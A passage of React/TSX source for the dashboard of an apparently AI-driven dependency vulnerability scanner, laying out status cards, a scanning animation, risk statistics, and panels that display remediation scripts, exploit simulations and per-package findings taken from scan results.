                        { label: "Groq Engine", status: "Online" },
                        { label: "OSV.dev Sync", status: "Connected" },
                      ].map((item) => (
                        <div key={item.label} className="flex items-center justify-between">
                          <span className="text-xs text-gray-400">{item.label}</span>
                          <span className="flex items-center gap-1.5 text-xs font-mono text-green-400 font-bold">
                            <span className="w-1.5 h-1.5 rounded-full bg-green-400 shadow-[0_0_6px_rgba(74,222,128,0.8)] animate-pulse" />
                            {item.status}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Row 2: CascadeFlow Routing + Budget Guard + Performance Analytics */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">

                  {/* Feature 3: CascadeFlow Model Routing Visualization */}
                  <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden">
                    <div className="absolute inset-0 bg-[url('/grid.svg')] bg-center opacity-[0.02] pointer-events-none" />
                    <div className="flex items-center gap-2 mb-4">
                      <Network className="w-4 h-4 text-cyan-400" />
                      <span className="text-xs font-bold uppercase tracking-widest text-white">CascadeFlow Routing</span>
                    </div>
                    <div className="relative space-y-1 before:absolute before:inset-y-0 before:left-[7px] before:w-px before:bg-gradient-to-b before:from-blue-500/50 before:via-purple-500/30 before:to-transparent">
                      {[
                        { label: "Input Acquisition", color: "bg-blue-400", glow: "shadow-[0_0_8px_rgba(96,165,250,0.7)]" },
                        { label: "Complexity Detection", color: "bg-cyan-400", glow: "shadow-[0_0_8px_rgba(34,211,238,0.7)]" },
                        { label: "Model Routing", color: "bg-purple-400", glow: "shadow-[0_0_8px_rgba(192,132,252,0.7)]" },
                        { label: "Threat Intelligence", color: "bg-yellow-400", glow: "shadow-[0_0_8px_rgba(250,204,21,0.7)]" },
                        { label: "Verification Pass", color: "bg-orange-400", glow: "shadow-[0_0_8px_rgba(251,146,60,0.7)]" },
                        { label: "Remediation Output", color: "bg-green-400", glow: "shadow-[0_0_8px_rgba(74,222,128,0.7)]" },
                      ].map((node, i) => (
                        <div key={i} className="flex items-center gap-3 py-1.5 pl-1">
                          <div className={`w-3.5 h-3.5 rounded-full shrink-0 ${node.color} ${node.glow} animate-pulse`} style={{ animationDelay: `${i * 0.3}s` }} />
                          <span className="text-xs text-gray-300">{node.label}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Feature 4: Runtime Budget Guard */}
                  <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden">
                    <div className="flex items-center gap-2 mb-4">
                      <ShieldAlert className="w-4 h-4 text-orange-400" />
                      <span className="text-xs font-bold uppercase tracking-widest text-white">Budget Guard</span>
                    </div>
                    <div className="space-y-3">
                      {[
                        { msg: "Efficient model selected for low-complexity scan.", color: "text-green-400", dot: "bg-green-400" },
                        { msg: "High-cost escalation prevented.", color: "text-yellow-400", dot: "bg-yellow-400" },
                        { msg: "Deep analysis routed only when required.", color: "text-blue-400", dot: "bg-blue-400" },
                        { msg: "Multi-model consensus reserved for CRITICAL severity.", color: "text-orange-400", dot: "bg-orange-400" },
                      ].map((item, i) => (
                        <div key={i} className="flex items-start gap-2">
                          <span className={`w-1.5 h-1.5 rounded-full ${item.dot} mt-1.5 shrink-0`} />
                          <span className={`text-xs font-mono ${item.color}`}>{item.msg}</span>
                        </div>
                      ))}
                    </div>
                    <div className="mt-4 pt-3 border-t border-white/5">
                      <span className="text-[10px] text-gray-600 font-mono">AI Runtime Governance — Enterprise Grade</span>
                    </div>
                  </div>

                  {/* Feature 6: AI Performance Analytics */}
                  <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden">
                    <div className="flex items-center gap-2 mb-4">
                      <BarChart2 className="w-4 h-4 text-blue-400" />
                      <span className="text-xs font-bold uppercase tracking-widest text-white">AI Performance</span>
                    </div>
                    <div className="space-y-3">
                      {[
                        { label: "Avg Response Latency", value: "1.4s" },
                        { label: "Orchestration Speed", value: "94%" },
                        { label: "Tokens Processed", value: "~18k" },
                        { label: "Runtime Efficiency", value: "High" },
                        { label: "Telemetry Events", value: "312" },
                      ].map((metric) => (
                        <div key={metric.label} className="flex items-center justify-between">
                          <span className="text-xs text-gray-400">{metric.label}</span>
                          <span className="text-xs font-mono font-bold text-blue-300">{metric.value}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Row 3: Tier System + Multi-Model Consensus */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">

                  {/* Feature 5: Tier System */}
                  <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden">
                    <div className="flex items-center gap-2 mb-4">
                      <Layers className="w-4 h-4 text-purple-400" />
                      <span className="text-xs font-bold uppercase tracking-widest text-white">Plan & Usage</span>
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                        <p className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-3">Free Tier</p>
                        <ul className="space-y-1.5">
                          {["Standard Scans", "Limited Deep Analysis", "Basic Telemetry", "5 Saved Reports"].map(f => (
                            <li key={f} className="flex items-center gap-1.5 text-xs text-gray-400">
                              <CheckCircle2 className="w-3 h-3 text-green-500 shrink-0" /> {f}
                            </li>
                          ))}
                        </ul>
                      </div>
                      <div className="bg-purple-500/10 rounded-xl p-4 border border-purple-500/30 relative">
                        <div className="absolute -top-2 -right-2 text-[10px] font-bold bg-purple-600 text-white px-2 py-0.5 rounded-full">PRO</div>
                        <p className="text-xs font-bold text-purple-300 uppercase tracking-wider mb-3">Enterprise</p>
                        <ul className="space-y-1.5">
                          {["Unlimited Orchestration", "Multi-Model Consensus", "Continuous Monitoring", "Compliance Reports"].map(f => (
                            <li key={f} className="flex items-center gap-1.5 text-xs text-purple-200">
                              <CheckCircle2 className="w-3 h-3 text-purple-400 shrink-0" /> {f}
                            </li>
                          ))}
                        </ul>
                      </div>
                    </div>
                  </div>

                  {/* Feature 7: Multi-Model Consensus */}
                  <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-32 h-32 bg-purple-500/10 blur-[60px] rounded-full pointer-events-none" />
                    <div className="flex items-center gap-2 mb-4">
                      <GitMerge className="w-4 h-4 text-orange-400" />
                      <span className="text-xs font-bold uppercase tracking-widest text-white">AI Consensus Intelligence</span>
                    </div>
                    <div className="space-y-3">
                      {[
                        { model: "Groq Fast", severity: "HIGH", color: "text-orange-400", bar: "bg-orange-400", pct: 70 },
                        { model: "Claude Deep", severity: "CRITICAL", color: "text-red-400", bar: "bg-red-400", pct: 95 },
                        { model: "Gemini Review", severity: "HIGH", color: "text-yellow-400", bar: "bg-yellow-400", pct: 72 },
                      ].map((m) => (
                        <div key={m.model}>
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-xs text-gray-400">{m.model}</span>
                            <span className={`text-xs font-mono font-bold ${m.color}`}>{m.severity}</span>
                          </div>
                          <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden">
                            <div className={`h-full ${m.bar} rounded-full transition-all`} style={{ width: `${m.pct}%` }} />
                          </div>
                        </div>
                      ))}
                      <div className="mt-3 pt-3 border-t border-white/10 flex items-center justify-between">
                        <span className="text-xs text-gray-400">Consensus Confidence</span>
                        <span className="text-sm font-mono font-black text-green-400">92%</span>
                      </div>
                    </div>
                  </div>
                </div>

              </motion.div>
            )}
            {/* END placeholder */}

          </div>
        )}

        {isScanning && (
          <motion.div initial={{ opacity: 0, scale: 0.98 }} animate={{ opacity: 1, scale: 1 }} className="min-h-[420px] flex flex-col items-center justify-center p-8 glass-card rounded-[2rem] border border-blue-500/30 relative overflow-hidden shadow-[0_0_50px_rgba(59,130,246,0.1)]">
            <div className="absolute inset-0 bg-blue-500/5 animate-pulse" />
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-blue-500 to-transparent animate-[shimmer_2s_infinite]"></div>

            <div className="relative z-10 w-full max-w-4xl grid grid-cols-1 md:grid-cols-2 gap-8 items-center">

              {/* Left Side: Pipeline Animation */}
              <div className="flex flex-col items-center text-center">
                <div className="w-24 h-24 relative mb-6">
                  <div className="absolute inset-0 border-4 border-blue-500/10 rounded-full"></div>
                  <div className="absolute inset-0 border-4 border-blue-500 border-t-transparent border-l-transparent rounded-full animate-[spin_1.5s_linear_infinite]"></div>
                  <div className="absolute inset-2 border-4 border-purple-500/30 border-b-transparent border-r-transparent rounded-full animate-[spin_2s_linear_infinite_reverse]"></div>
                  <BrainCircuit className="w-10 h-10 text-blue-400 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 animate-pulse" />
                </div>

                <h3 className="text-2xl font-bold text-white mb-2 tracking-tight">CascadeFlow Orchestration</h3>
                <p className="text-blue-400 font-mono text-sm mb-6 bg-blue-500/10 px-3 py-1 rounded-full border border-blue-500/20">Security Analysis Progress — {Math.min(100, Math.round(((scanStepIndex + 1) / SCAN_STEPS.length) * 100))}%</p>

                <div className="w-full max-w-xs text-left space-y-3 relative before:absolute before:inset-y-0 before:left-[11px] before:w-[2px] before:bg-blue-900/30">
                  {SCAN_STEPS.map((step, idx) => (
                    <div key={idx} className={`relative pl-8 transition-all duration-700 ${idx === scanStepIndex ? "text-blue-400 scale-105 drop-shadow-[0_0_8px_rgba(96,165,250,0.5)]" : idx < scanStepIndex ? "text-gray-500" : "text-gray-700 opacity-50"}`}>
                      <div className={`absolute left-0 top-1 w-6 h-6 -ml-1 rounded-full flex items-center justify-center bg-[#050505] border ${idx === scanStepIndex ? 'border-blue-400 shadow-[0_0_10px_rgba(96,165,250,0.5)]' : idx < scanStepIndex ? 'border-green-500' : 'border-gray-800'}`}>
                        {idx < scanStepIndex ? <CheckCircle2 className="w-3.5 h-3.5 text-green-500" /> : idx === scanStepIndex ? <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse" /> : <div className="w-1.5 h-1.5 bg-gray-700 rounded-full" />}
                      </div>
                      <span className="text-sm font-medium">{step}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Right Side: Runtime Telemetry */}
              <div className="flex flex-col h-[320px]">
                <div className="glass-card rounded-2xl border border-gray-700 overflow-hidden relative shadow-[0_0_30px_rgba(0,0,0,0.5)] flex flex-col h-full bg-black/40">
                  <div className="bg-black/60 px-4 py-3 border-b border-gray-800 flex items-center justify-between shrink-0">
                    <div className="flex items-center gap-2">
                      <Terminal className="w-4 h-4 text-green-500" />
                      <span className="font-mono text-xs text-gray-300 font-bold uppercase tracking-wider">Live Runtime Feed</span>
                    </div>
                    <div className="flex gap-1.5">
                      <div className="w-2 h-2 rounded-full bg-blue-500 animate-pulse shadow-[0_0_8px_rgba(59,130,246,0.8)]"></div>
                    </div>
                  </div>
                  <div className="p-4 flex-1 overflow-y-hidden font-mono text-xs text-green-400/80 space-y-2 flex flex-col justify-end">
                    {scanStepIndex >= 0 && <div className="opacity-40">[{new Date(Date.now() - 4000).toLocaleTimeString()}] Target acquired.</div>}
                    {scanStepIndex >= 1 && <div className="opacity-50">[{new Date(Date.now() - 3000).toLocaleTimeString()}] OSV connection established...</div>}
                    {scanStepIndex >= 2 && <div className="opacity-70">[{new Date(Date.now() - 2000).toLocaleTimeString()}] CascadeFlow runtime active.</div>}
                    {scanStepIndex >= 3 && <div className="opacity-90">[{new Date(Date.now() - 1000).toLocaleTimeString()}] Threat graph compiling...</div>}
                    {scanStepIndex >= 4 && <div>[{new Date(Date.now() - 500).toLocaleTimeString()}] AI routing initialized...</div>}
                    {scanStepIndex >= 0 && <div className="text-blue-400 font-bold">[{new Date().toLocaleTimeString()}] Executing step: {SCAN_STEPS[scanStepIndex]}</div>}
                  </div>
                  <div className="p-3 bg-black/80 border-t border-gray-800 grid grid-cols-2 gap-2 text-[10px] uppercase font-bold tracking-widest text-gray-500">
                    <div>Status: <span className="text-green-400">Active</span></div>
                    <div>Routing: <span className="text-purple-400">CascadeFlow</span></div>
                  </div>
                </div>
              </div>

            </div>
          </motion.div>
        )}

        {scanResult && stats && !isScanning && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-8">

            <div className="flex flex-col sm:flex-row sm:items-center justify-between mt-4 mb-2 gap-4">
              <h2 className="text-2xl font-bold tracking-tight">Intelligence Dashboard</h2>
              <div className="flex items-center gap-3">
                <button
                  onClick={handleSaveReport}
                  disabled={isSavingReportData}
                  className="flex items-center justify-center gap-2 bg-yellow-500/10 hover:bg-yellow-500/20 border border-yellow-500/20 px-5 py-2.5 rounded-xl text-sm font-bold text-yellow-400 transition-all shadow-lg hover:shadow-[0_0_15px_rgba(234,179,8,0.1)] disabled:opacity-50"
                >
                  {isSavingReportData ? <Loader2 className="w-4 h-4 animate-spin" /> : <ShieldCheck className="w-4 h-4 text-yellow-400" />}
                  {saveReportSuccess ? "Saved Successfully" : "Save Report"}
                </button>
                <button onClick={() => setShowExportModal(true)} className="flex items-center justify-center gap-2 bg-white/5 hover:bg-white/10 border border-white/10 px-5 py-2.5 rounded-xl text-sm font-medium transition-colors shadow-lg hover:shadow-[0_0_15px_rgba(255,255,255,0.05)]">
                  <Download className="w-4 h-4 text-blue-400" />
                  Export Report
                </button>
              </div>
            </div>

            <div id="pdf-content-wrapper" className="space-y-8">

              {/* LOCKED CORE DASHBOARD SECTION — DO NOT MODIFY */}
              {scanResult.repoMetadata && (
                <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="grid grid-cols-2 lg:grid-cols-5 gap-4">
                  <div className="glass-card p-4 rounded-2xl border border-white/5 flex flex-col items-center justify-center text-center shadow-[0_0_20px_rgba(255,255,255,0.02)] hover:bg-white/5 transition-colors">
                    <GitBranch className="w-6 h-6 text-white mb-2 opacity-80" />
                    <p className="text-[10px] text-gray-500 uppercase font-bold tracking-wider mb-1">Repository</p>
                    <p className="font-bold text-white text-sm truncate w-full px-2" title={scanResult.repoMetadata.name}>{scanResult.repoMetadata.name}</p>
                  </div>
                  <div className="glass-card p-4 rounded-2xl border border-white/5 flex flex-col items-center justify-center text-center shadow-[0_0_20px_rgba(255,255,255,0.02)] hover:bg-white/5 transition-colors">
                    <User className="w-6 h-6 text-gray-400 mb-2 opacity-80" />
                    <p className="text-[10px] text-gray-500 uppercase font-bold tracking-wider mb-1">Owner</p>
                    <p className="font-bold text-white text-sm truncate w-full px-2" title={scanResult.repoMetadata.owner}>{scanResult.repoMetadata.owner}</p>
                  </div>
                  <div className="glass-card p-4 rounded-2xl border border-white/5 flex flex-col items-center justify-center text-center shadow-[0_0_20px_rgba(255,255,255,0.02)] hover:bg-white/5 transition-colors">
                    <Star className="w-6 h-6 text-yellow-400 mb-2 opacity-80" />
                    <p className="text-[10px] text-gray-500 uppercase font-bold tracking-wider mb-1">Stars</p>
                    <p className="font-bold text-white text-sm truncate w-full px-2">{scanResult.repoMetadata.stars.toLocaleString()}</p>
                  </div>
                  <div className="glass-card p-4 rounded-2xl border border-white/5 flex flex-col items-center justify-center text-center shadow-[0_0_20px_rgba(255,255,255,0.02)] hover:bg-white/5 transition-colors">
                    <Code className="w-6 h-6 text-blue-400 mb-2 opacity-80" />
                    <p className="text-[10px] text-gray-500 uppercase font-bold tracking-wider mb-1">Language</p>
                    <p className="font-bold text-white text-sm truncate w-full px-2">{scanResult.repoMetadata.language || 'N/A'}</p>
                  </div>
                  <div className={`glass-card p-4 rounded-2xl border flex flex-col items-center justify-center text-center shadow-lg transition-colors ${stats.riskLevel === 'CRITICAL RISK' ? 'border-red-500/30 bg-red-500/10 shadow-[0_0_20px_rgba(239,68,68,0.15)]' : stats.riskLevel === 'HIGH RISK' ? 'border-orange-500/30 bg-orange-500/10 shadow-[0_0_20px_rgba(249,115,22,0.15)]' : stats.riskLevel === 'MODERATE RISK' ? 'border-yellow-500/30 bg-yellow-500/10 shadow-[0_0_20px_rgba(234,179,8,0.15)]' : 'border-green-500/30 bg-green-500/10 shadow-[0_0_20px_rgba(34,197,94,0.15)]'}`}>
                    <ShieldAlert className={`w-6 h-6 mb-2 opacity-90 ${stats.riskLevel === 'CRITICAL RISK' ? 'text-red-400' : stats.riskLevel === 'HIGH RISK' ? 'text-orange-400' : stats.riskLevel === 'MODERATE RISK' ? 'text-yellow-400' : 'text-green-400'}`} />
                    <p className="text-[10px] text-gray-400 uppercase font-bold tracking-wider mb-1">Exposure</p>
                    <p className="font-bold text-white text-sm truncate w-full px-2 drop-shadow-[0_0_8px_rgba(255,255,255,0.3)]">{stats.riskLevel === 'SECURE' ? 'Secure' : stats.riskLevel}</p>
                  </div>
                </motion.div>
              )}

              {/* Executive Overview Stats - Single Row */}
              <div className="grid grid-cols-2 lg:grid-cols-5 gap-6">
                <div className="col-span-2 lg:col-span-1 glass-card p-6 rounded-2xl border border-white/5 flex flex-col justify-center relative overflow-hidden group hover:border-white/10 transition-colors">
                  <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full blur-3xl -mr-10 -mt-10 group-hover:bg-white/10 transition-colors"></div>
                  <p className="text-gray-400 text-sm font-semibold mb-3 uppercase tracking-widest">Calculated Posture</p>
                  <div className="flex items-end gap-3">
                    <span className={`px-4 py-2 rounded-xl text-sm font-bold border transition-all whitespace-nowrap ${stats.riskColor}`}>
                      {stats.riskLevel}
                    </span>
                  </div>
                </div>

                <StatCard label="Total Risks" value={stats.total} color="text-white" />
                <StatCard label="Critical" value={stats.critical} color="text-red-400" />
                <StatCard label="High" value={stats.high} color="text-orange-400" />
                <StatCard label="Med/Low" value={stats.medium + stats.low} color="text-yellow-400" />
              </div>

              {/* Main Enterprise Grid Structure */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">

                {/* LEFT COLUMN (Intelligence & Telemetry) */}
                <div className="lg:col-span-8 space-y-8">

                  {/* Row 1: Telemetry (65%) + Chart (35%) */}
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6 md:h-[280px]">

                    {/* Compact Runtime Telemetry Log */}
                    <div className="md:col-span-2 glass-card rounded-2xl border border-gray-700 overflow-hidden relative shadow-[0_0_30px_rgba(0,0,0,0.5)] flex flex-col h-[280px] md:h-full">
                      <div className="bg-black/60 px-4 py-3 border-b border-gray-800 flex items-center justify-between shrink-0">
                        <div className="flex items-center gap-2">
                          <Terminal className="w-4 h-4 text-green-500" />
                          <span className="font-mono text-xs text-gray-300 font-bold uppercase tracking-wider">CascadeFlow Telemetry</span>
                        </div>
                        <div className="flex gap-1.5">
                          <div className="w-2.5 h-2.5 rounded-full bg-red-500/50"></div>
                          <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/50"></div>
                          <div className="w-2.5 h-2.5 rounded-full bg-green-500/80 shadow-[0_0_5px_rgba(34,197,94,0.8)]"></div>
                        </div>
                      </div>
                      <div className="p-4 flex-1 overflow-y-auto font-mono text-xs text-green-400/80 space-y-2 custom-scrollbar bg-[#050505]">
                        {telemetry.map((log, i) => (
                          <div key={i} className="flex gap-3 hover:bg-white/5 px-2 py-1 rounded transition-colors">
                            <span className="text-gray-500 shrink-0 opacity-50">{`>`}</span>
                            <span className="break-words" dangerouslySetInnerHTML={{ __html: log.replace(/(\[.*?\])/, '<span class="text-blue-400/80">$1</span>').replace(/(gpt-4o-mini|gpt-4o|CascadeFlow)/g, '<span class="text-purple-400 font-bold">$1</span>') }} />
                          </div>
                        ))}
                        <div ref={telemetryEndRef} />
                      </div>
                    </div>

                    {/* Compact Severity Chart */}
                    <div className="md:col-span-1 glass-card rounded-2xl border border-white/5 p-5 flex flex-col bg-black/20 h-[280px] md:h-full">
                      <div className="flex items-center gap-2 mb-4 shrink-0">
                        <BarChart2 className="w-5 h-5 text-gray-400" />
                        <h3 className="text-sm font-bold uppercase tracking-wider text-gray-300">Severity</h3>
                      </div>
                      {stats.chartData.length > 0 ? (
                        <div className="flex-1 flex flex-col justify-center gap-4 mt-2">
                          {stats.chartData.map((data, idx) => (
                            <div key={idx} className="space-y-1.5 group cursor-default">
                              <div className="flex justify-between text-xs font-bold uppercase tracking-wider">
                                <span style={{ color: data.color }} className="drop-shadow-[0_0_5px_currentColor]">{data.name}</span>
                                <span className="text-gray-400">{data.count} <span className="text-gray-600">({Math.round((data.count / stats.total) * 100)}%)</span></span>
                              </div>
                              <div className="h-2 w-full bg-white/5 rounded-full overflow-hidden border border-white/5 relative">
                                <motion.div
                                  initial={{ width: 0 }}
                                  animate={{ width: `${(data.count / stats.total) * 100}%` }}
                                  transition={{ duration: 1, ease: "easeOut", delay: idx * 0.1 }}
                                  className="h-full rounded-full relative"
                                  style={{ backgroundColor: data.color, boxShadow: `0 0 10px ${data.color}` }}
                                />
                              </div>
                            </div>
                          ))}
                        </div>
                      ) : (
                        <div className="flex-1 flex flex-col items-center justify-center text-gray-500 gap-3">
                          <CheckCircle2 className="w-8 h-8 text-green-500/50" />
                          <span className="text-sm font-medium">No vulnerabilities</span>
                        </div>
                      )}
                    </div>

                  </div>

                  {/* Row 2: Vulnerability Intelligence Summary */}
                  {/* ========================================================= */}
                  {/* CORE INTELLIGENCE SECTION - DO NOT REMOVE                   */}
                  {/* ========================================================= */}
                  <div className="space-y-6">
                    {/* Executive Security Briefing */}
                    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="glass-card rounded-2xl border border-blue-500/30 overflow-hidden relative shadow-[0_0_30px_rgba(59,130,246,0.1)]">
                      <div className="absolute top-0 left-0 w-1.5 h-full bg-gradient-to-b from-blue-400 to-purple-600"></div>
                      <div className="p-6 md:p-8 relative z-10">
                        <div className="flex items-center gap-3 mb-5">
                          <div className="w-10 h-10 rounded-xl bg-blue-500/20 flex items-center justify-center border border-blue-500/30">
                            <BrainCircuit className="w-5 h-5 text-blue-400" />
                          </div>
                          <h3 className="text-xl font-bold text-white tracking-tight">Executive Security Briefing</h3>
                        </div>
                        <div className="text-gray-300 leading-relaxed text-base font-light">
                          {scanResult.overall_ai_summary ? renderFormattedText(scanResult.overall_ai_summary) : <span className="text-gray-500 italic">No executive briefing generated for this scan.</span>}
                        </div>
                      </div>
                    </motion.div>

                    {/* Remediation Action & Threat Simulation */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      {/* Remediation Action */}
                      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="glass-card rounded-2xl border border-green-500/30 p-6 bg-gradient-to-br from-green-500/5 to-transparent shadow-[0_0_20px_rgba(34,197,94,0.05)] relative overflow-hidden flex flex-col">
                        <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                        <div className="flex items-center justify-between mb-4">
                          <div className="flex items-center gap-3">
                            <div className="w-8 h-8 rounded-lg bg-green-500/20 flex items-center justify-center border border-green-500/30">
                              <Terminal className="w-4 h-4 text-green-400" />
                            </div>
                            <h3 className="text-lg font-bold text-white">Remediation Action</h3>
                          </div>
                        </div>
                        <div className="flex-1 flex flex-col justify-center">
                          {scanResult.remediation_script ? (
                            <div className="flex items-center justify-between bg-black/60 border border-white/10 rounded-xl p-4 font-mono text-sm text-green-300">
                              <code className="break-all">{scanResult.remediation_script}</code>
                              <button onClick={() => navigator.clipboard.writeText(scanResult.remediation_script!)} className="ml-4 text-gray-400 hover:text-white transition-colors bg-white/5 hover:bg-white/10 p-2 rounded-lg border border-white/5 shrink-0">
                                <Copy className="w-4 h-4" />
                              </button>
                            </div>
                          ) : (
                            <div className="text-gray-500 text-sm italic p-4 bg-black/40 rounded-xl border border-white/5">No immediate remediation action required.</div>
                          )}
                        </div>
                      </motion.div>

                      {/* Threat Simulation */}
                      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="glass-card rounded-2xl border border-red-500/30 p-6 bg-gradient-to-br from-red-500/5 to-transparent shadow-[0_0_20px_rgba(239,68,68,0.05)] relative overflow-hidden flex flex-col">
                        <div className="absolute top-0 left-0 w-1 h-full bg-red-500"></div>
                        <div className="flex items-center gap-3 mb-4">
                          <div className="w-8 h-8 rounded-lg bg-red-500/20 flex items-center justify-center border border-red-500/30">
                            <AlertTriangle className="w-4 h-4 text-red-400" />
                          </div>
                          <h3 className="text-lg font-bold text-white">Threat Simulation</h3>
                        </div>
                        <div className="flex-1 bg-black rounded-xl border border-red-500/20 overflow-hidden flex flex-col group relative">
                          <div className="absolute inset-0 bg-red-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                          <div className="bg-red-500/10 border-b border-red-500/20 px-4 py-2 flex items-center justify-between">
                            <span className="text-[10px] uppercase tracking-widest text-red-400 font-bold font-mono">Exploit Vector</span>
                            <div className="flex gap-1.5"><div className="w-2 h-2 rounded-full bg-red-500/30"></div><div className="w-2 h-2 rounded-full bg-red-500/30"></div><div className="w-2 h-2 rounded-full bg-red-500/80"></div></div>
                          </div>
                          {scanResult.exploit_simulation ? (
                            <pre className="p-4 font-mono text-sm text-red-300/90 overflow-x-auto leading-relaxed relative z-10 custom-scrollbar whitespace-pre-wrap">
                              <code>{scanResult.exploit_simulation}</code>
                            </pre>
                          ) : (
                            <div className="p-4 text-gray-500 text-sm italic">No threat simulation generated for this payload.</div>
                          )}
                        </div>
                      </motion.div>
                    </div>
                  </div>

                  {/* Row 3: Affected Components Details */}
                  <div className="pt-4">
                    {stats.total === 0 ? (
                      <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="p-12 glass-card rounded-3xl border border-green-500/30 text-center relative overflow-hidden">
                        <div className="absolute inset-0 bg-green-500/5" />
                        <div className="relative z-10">
                          <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-500/20 shadow-[0_0_30px_rgba(34,197,94,0.2)]">
                            <CheckCircle2 className="w-10 h-10 text-green-500" />
                          </div>
                          <h3 className="text-3xl font-bold text-white mb-3">System Secure</h3>
                          <p className="text-gray-400 text-lg">No known vulnerabilities were detected across {scanResult.extracted_count} parsed dependencies.</p>
                        </div>
                      </motion.div>
                    ) : (
                      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
                        <h3 className="text-2xl font-bold mb-6 flex items-center gap-3">
                          <FileJson className="w-6 h-6 text-blue-400" />
                          Affected Components ({Object.keys(stats.packageGroups).length})
                        </h3>

                        {Object.entries(stats.packageGroups).map(([pkgName, vulns], idx) => {
                          const isExpanded = expandedPackages[pkgName];
                          const criticalCount = vulns.filter(v => v.severity.toUpperCase() === 'CRITICAL').length;
                          const highCount = vulns.filter(v => v.severity.toUpperCase() === 'HIGH').length;

                          return (
                            <motion.div
                              key={pkgName}
                              initial={{ opacity: 0, y: 10 }}
                              animate={{ opacity: 1, y: 0 }}
                              transition={{ delay: 0.1 + (idx * 0.05) }}
                              className="glass-card rounded-2xl border border-white/5 overflow-hidden shadow-lg hover:border-white/10 transition-colors"
                            >
                              <div
                                onClick={() => togglePackage(pkgName)}
                                className="p-5 md:p-6 flex items-center justify-between cursor-pointer hover:bg-white/5 transition-colors select-none"
                              >
                                <div className="flex items-center gap-5">
                                  <div className={`w-2 h-12 rounded-full ${criticalCount > 0 ? 'bg-red-500 shadow-[0_0_10px_rgba(239,68,68,0.5)]' : highCount > 0 ? 'bg-orange-500 shadow-[0_0_10px_rgba(249,115,22,0.5)]' : 'bg-yellow-500 shadow-[0_0_10px_rgba(234,179,8,0.5)]'}`} />
                                  <div>
                                    <h4 className="text-lg md:text-xl font-bold font-mono text-white tracking-tight">{pkgName}</h4>
                                    <p className="text-gray-400 text-sm mt-0.5">{vulns.length} {vulns.length === 1 ? 'finding' : 'findings'} detected</p>
                                  </div>
                                </div>
                                <div className="flex items-center gap-4">
                                  <div className="hidden md:flex gap-2">
                                    {criticalCount > 0 && <span className="px-2.5 py-1 text-xs font-bold bg-red-500/20 text-red-400 border border-red-500/30 rounded-lg">{criticalCount} CRITICAL</span>}
                                    {highCount > 0 && <span className="px-2.5 py-1 text-xs font-bold bg-orange-500/20 text-orange-400 border border-orange-500/30 rounded-lg">{highCount} HIGH</span>}
                                  </div>
                                  <div className={`w-8 h-8 rounded-full flex items-center justify-center transition-colors ${isExpanded ? 'bg-white/10' : 'bg-white/5'}`}>
                                    {isExpanded ? <ChevronUp className="w-4 h-4 text-white" /> : <ChevronDown className="w-4 h-4 text-white" />}
                                  </div>
                                </div>
                              </div>

                              <AnimatePresence>
                                {isExpanded && (
                                  <motion.div
                                    initial={{ height: 0, opacity: 0 }}
                                    animate={{ height: "auto", opacity: 1 }}
                                    exit={{ height: 0, opacity: 0 }}
                                    transition={{ duration: 0.2, ease: "easeInOut" }}
                                    className="border-t border-white/5 bg-black/40"
                                  >
                                    <div className="p-5 md:p-6 space-y-4">
                                      {vulns.map((vuln, vIdx) => (
                                        <div key={vIdx} className="bg-white/5 rounded-xl p-5 border border-white/5 hover:bg-white/[0.07] transition-colors">
                                          <div className="flex flex-wrap items-center gap-3 mb-4">
                                            <span
                                              onClick={() => handleOpenExplainModal({ id: vuln.id, packageName: pkgName, severity: vuln.severity, description: vuln.description, aliases: vuln.aliases })}
                                              className={`px-2.5 py-1 text-xs font-bold text-white rounded-md bg-gray-700 shadow-sm cursor-pointer hover:opacity-80 transition-opacity ${vuln.severity.toUpperCase() === 'CRITICAL' ? '!bg-red-600' :
                                                vuln.severity.toUpperCase() === 'HIGH' ? '!bg-orange-600' :
                                                  (vuln.severity.toUpperCase() === 'MODERATE' || vuln.severity.toUpperCase() === 'MEDIUM') ? '!bg-yellow-600' : '!bg-blue-600'
                                                }`}
                                              title="Click to view AI Security Intelligence"
                                            >
                                              {vuln.severity}
                                            </span>
                                            <span
                                              onClick={() => handleOpenExplainModal({ id: vuln.id, packageName: pkgName, severity: vuln.severity, description: vuln.description, aliases: vuln.aliases })}
